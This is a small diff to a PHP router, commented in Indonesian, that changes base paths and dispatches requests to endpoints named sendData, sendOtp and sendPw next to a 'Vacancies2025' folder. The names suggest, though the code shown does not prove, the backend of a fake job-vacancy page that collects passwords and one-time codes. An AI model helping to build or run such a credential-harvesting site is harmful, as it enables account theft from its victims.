@@ -6,12 +6,12 @@ $path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
 if ($path === '/data/sendData.php' || $path === '/data/sendOtp.php' || $path === '/data/sendPw.php') {
     // Set REQUEST_URI agar file backend tahu request-nya
     $_SERVER['SCRIPT_NAME'] = $path;
-    require __DIR__ . '/../Vacancies2025' . $path;
+    require __DIR__ . '/..' . $path;
     return;
 }
 
 // Semua request lain: serve file statis / index.php
-$publicDir = __DIR__ . '/../Vacancies2025';
+$publicDir = __DIR__ . '/..';
 
 if ($path === '/' || $path === '') {
     require $publicDir . '/index.php';
